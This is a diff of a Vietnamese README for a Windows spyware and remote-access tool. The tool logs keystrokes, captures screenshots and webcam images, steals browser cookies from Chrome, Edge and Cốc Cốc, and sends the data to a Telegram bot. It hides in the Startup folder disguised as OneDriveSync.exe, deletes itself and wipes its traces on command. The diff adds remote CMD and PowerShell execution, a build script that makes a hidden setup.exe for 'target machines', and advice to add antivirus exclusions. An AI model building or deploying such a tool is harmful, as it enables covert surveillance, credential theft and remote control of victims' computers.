@@ -13,7 +13,7 @@ Dự án là một công cụ giám sát và thu thập thông tin hoạt độn
 2. **Chụp Màn Hình & Webcam Định Kỳ**:
    * Tự động chụp ảnh màn hình định kỳ (mặc định 30 giây).
    * Đóng gói và gửi báo cáo phím kèm ảnh màn hình về Telegram theo chu kỳ (mặc định 120 giây).
-   * Chụp ảnh webcam thời gian thực qua lệnh Telegram (sử dụng thư viện `OpenCV`, tự động bỏ qua an toàn nếu máy mục tiêu không cài đặt webcam hoặc thư viện).
+   * Chụp ảnh webcam thời gian thực qua lệnh Telegram (sử dụng API Windows native qua ctypes, bỏ qua an toàn và không cần cài đặt OpenCV hay thư viện ngoài).
 
 3. **Thu Thập Dữ Liệu Trình Duyệt**:
    * Quét và trích xuất dữ liệu Cookie từ các trình duyệt phổ biến: **Google Chrome, Microsoft Edge, Cốc Cốc**.
@@ -25,18 +25,23 @@ Dự án là một công cụ giám sát và thu thập thông tin hoạt độn
 
 5. **Bảng Điều Khiển Nút Bấm Inline (Interactive Panel)**:
    * Khi gửi lệnh `/status`, mỗi máy online sẽ trả về một **Thẻ trạng thái** kèm hệ thống nút bấm tương tác nhanh bên dưới. Bấm nút dưới thẻ của máy nào thì lệnh chỉ thực thi trên máy đó, không bị chồng chéo.
-   * Menu lệnh nhanh ở góc trái thanh chat (khi gõ `/`) tự động cấu hình tối giản gồm `/status` và `/help` để tránh vô tình gửi lệnh hàng loạt.
+   * Menu lệnh nhanh ở góc trái thanh chat (khi gõ `/`) tự động cấu hình tối giản gồm `/list`, `/status` và `/help` để tránh vô tình gửi lệnh hàng loạt.
+   * Hỗ trợ lệnh `/list` để hiển thị nhanh danh sách tất cả các thiết bị đang online dưới dạng các nút bấm chứa tên máy trực quan để chọn xem status nhanh chóng.
 
-6. **Chạy Ẩn Khởi Động Cùng Windows (Startup)**:
+6. **Chạy Ẩn Khởi Động Cùng Windows (Startup) & Tự Dọn Dẹp**:
    * Tự động sao chép chính nó vào thư mục Startup dưới tên giả lập `OneDriveSync.exe` để duy trì hoạt động ngầm mỗi khi khởi động máy.
+   * Tích hợp cơ chế tự dọn dẹp (Self-deletion) để tự động xóa file chạy tải về gốc sau khi nhân bản thành công vào Startup.
 
 7. **Lưu Trữ Tạm Thời & Gửi Bù Khi Mất Mạng (Outbox Queue)**:
    * Khi máy mục tiêu mất kết nối Internet, ảnh màn hình và log phím được mã hóa lưu trữ tạm thời tại thư mục Cache ẩn của hệ thống.
    * Khi có mạng trở lại, hệ thống tự động quét và gửi bù dữ liệu cũ (mặc định thử lại mỗi 60 giây).
 
-8. **Cơ Chế Tự Hủy Hoàn Toàn (Self-Destruct)**:
+8. **Cơ Chế Tự Hủy An Toàn (Self-Destruct)**:
    * Lệnh `/destruct` sẽ tạo một script batch độc lập chạy ngầm để giải phóng tiến trình, xóa file thực thi gốc, xóa file khởi động cùng Windows, xóa toàn bộ thư mục dữ liệu cache tạm thời và tự xóa chính nó để không để lại bất kỳ dấu vết nào.
-   * Tích hợp cơ chế bỏ qua tin nhắn cũ khi khởi động lại sau tự hủy để tránh bị lặp lệnh vô hạn.
+   * Yêu cầu nhập đúng cú pháp `/destruct Y @Tên_Máy` để xác nhận thực hiện nhằm tránh vô tình bấm nhầm.
+
+9. **Thực Thi Lệnh Shell Từ Xa**:
+   * Hỗ trợ chạy các lệnh Command Prompt (`cmd <lệnh>`) hoặc PowerShell (`ps <lệnh>`) trực tiếp từ Telegram và trả về kết quả phản hồi tức thời.
 
 ---
 
@@ -58,7 +63,7 @@ Dữ liệu của công cụ được ẩn và lưu trữ tại đường dẫn 
 
 ### 1. Cài đặt các thư viện cần thiết:
 ```bash
-pip install pyperclip pynput mss requests opencv-python playwright pywin32
+pip install pyperclip pynput mss requests playwright pywin32
 ```
 *Sau khi cài đặt `playwright`, chạy lệnh cấu hình ban đầu:*
 ```bash
@@ -78,6 +83,7 @@ Bạn có thể gửi lệnh trực tiếp hoặc bấm qua Menu ở góc trái 
 
 | Lệnh | Mô tả | Định dạng cụ thể |
 | :--- | :--- | :--- |
+| `/list` | Liệt kê nhanh danh sách các thiết bị đang online dưới dạng các nút bấm chứa tên máy trực quan. | `/list` |
 | `/status` | Xem trạng thái hoạt động, thời gian chạy và hiển thị bảng nút bấm điều khiển của từng máy. | `/status` hoặc `/status @Tên_Máy` |
 | `/webcam` | Yêu cầu máy mục tiêu chụp ảnh webcam và gửi về. | `/webcam` hoặc `/webcam @Tên_Máy` |
 | `/browser` | Trích xuất và gửi file text chứa toàn bộ Cookies trình duyệt Chrome, Edge, Cốc Cốc. | `/browser` hoặc `/browser @Tên_Máy` |
@@ -87,23 +93,38 @@ Bạn có thể gửi lệnh trực tiếp hoặc bấm qua Menu ở góc trái 
 | `/pause` | Tạm dừng các hoạt động giám sát ngầm (keylog, chụp màn hình, kiểm tra clipboard) nhưng vẫn giữ kết nối nhận lệnh Telegram. | `/pause` hoặc `/pause @Tên_Máy` |
 | `/resume` | Tiếp tục (chạy lại) các hoạt động giám sát ngầm đã bị tạm dừng. | `/resume` hoặc `/resume @Tên_Máy` |
 | `/auth` | Chuyển quyền điều khiển tool sang tài khoản Telegram mới nếu tài khoản cũ bị khóa (die). | `/auth <secret_key>` |
-| `/update` | Cập nhật file `.exe` phiên bản mới từ Telegram hoặc tải về trực tiếp từ link lưu trữ ngoài. | Đính kèm file với caption: <code>/update @Tên_Máy</code> hoặc gửi lệnh: <code>/update &lt;direct_link&gt; @Tên_Máy</code> |
-| `/destruct` | Kích hoạt tự hủy tool, xóa sạch file chạy, Registry Startup và thư mục Cache lưu trữ. | `/destruct` hoặc `/destruct @Tên_Máy` |
+| `/update` | Cập nhật file `.exe` phiên bản mới từ Telegram hoặc tải về trực tiếp từ link trực tiếp ngoài. | Đính kèm file với caption: <code>/update @Tên_Máy</code> hoặc gửi lệnh: <code>/update &lt;direct_link&gt; @Tên_Máy</code> |
+| `cmd <lệnh>` | Chạy lệnh CMD (Command Prompt) trên máy mục tiêu và gửi kết quả về Telegram. | `cmd <lệnh>` hoặc `cmd <lệnh> @Tên_Máy` |
+| `ps <lệnh>` | Chạy lệnh PowerShell trên máy mục tiêu và gửi kết quả về Telegram. | `ps <lệnh>` hoặc `ps <lệnh> @Tên_Máy` |
+| `/destruct` | Kích hoạt tự hủy tool, xóa sạch file chạy, Registry Startup và thư mục Cache lưu trữ (Yêu cầu nhập chữ Y để xác nhận). | `/destruct Y @Tên_Máy` |
 | `/help` | Hiển thị bảng hướng dẫn sử dụng chi tiết này. | `/help` hoặc `/help @Tên_Máy` |
 
 ---
 
 ## 📦 Hướng Dẫn Đóng Gói Thành File `.exe` Chạy Độc Lập
 
-Để đóng gói mã nguồn thành một file thực thi duy nhất, không hiển thị màn hình đen console khi chạy ngầm và đóng gói đầy đủ các thư viện gọi động (`cv2`, `playwright`), hãy sử dụng lệnh `pyinstaller` sau:
+Để thuận tiện nhất cho việc biên dịch và tối ưu hóa dung lượng (giảm từ 100MB xuống còn **47MB**), dự án đi kèm một script đóng gói tự động **`build.bat`**.
 
+### Cách Đóng Gói Nhanh (Khuyên Dùng):
+1. Mở PowerShell hoặc Command Prompt tại thư mục chứa dự án: `c:\Users\MTC PC\Downloads\gmail_reader\klg`
+2. Nhấp đúp chuột chạy trực tiếp file **`build.bat`** (hoặc chạy qua cmd: `.\build.bat`).
+3. Script sẽ tự động:
+   * Kích hoạt môi trường ảo sạch `clean_env/` (đã dựng sẵn các gói thư viện tối giản, không chứa OpenCV, NumPy giúp giảm 50% dung lượng).
+   * Thực hiện đóng gói mã nguồn thành file chạy ẩn ngầm không có màn hình đen console.
+   * Di chuyển file chạy thành phẩm ra thư mục gốc dưới tên: **`klg/setup.exe`**.
+   * Tự động xóa sạch toàn bộ thư mục và file rác sinh ra trong quá trình biên dịch (`build/`, `dist/`, `setup.spec`).
+
+---
+
+### Hướng Dẫn Đóng Gói Thủ Công (Bản Đầy Đủ):
+Nếu muốn tự cài đặt và đóng gói thủ công, sử dụng các lệnh sau:
 ```bash
-# 1. Cài đặt pyinstaller nếu chưa có
+# 1. Cài đặt pyinstaller
 pip install pyinstaller
 
-# 2. Chạy lệnh compile
-pyinstaller --onefile --noconsole --clean --hidden-import cv2 --hidden-import playwright --hidden-import pynput.keyboard._win32 klg/klg.py
+# 2. Chạy lệnh compile loại bỏ các thư viện đồ họa OpenCV/NumPy cồng kềnh
+pyinstaller --onefile --noconsole --clean --name setup --hidden-import playwright --hidden-import pynput.keyboard._win32 --exclude-module numpy --exclude-module cv2 klg.py
 ```
 
-* File đầu ra sẽ nằm trong thư mục `dist/klg.exe`. Bạn có thể đổi tên thành `OneDriveSync.exe` hoặc bất kỳ tên nào khác và phân phối tới máy mục tiêu.
-* **Lưu ý**: Hãy thêm thư mục chứa file `.exe` vào danh sách loại trừ (Exclusion) của Windows Defender hoặc phần mềm Antivirus trên máy thử nghiệm để tránh bị chặn.
+* File đầu ra sẽ là `setup.exe`. Bạn có thể đổi tên thành `OneDriveSync.exe` hoặc bất kỳ tên nào khác và khởi chạy trên máy mục tiêu.
+* **Lưu ý Quan Trọng**: Hãy thêm thư mục chứa file `.exe` hoặc bản sao tại Startup (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe`) vào danh sách loại trừ (Exclusion) của Windows Defender hoặc phần mềm Antivirus trên máy thử nghiệm để tránh bị chặn chạy ngầm.
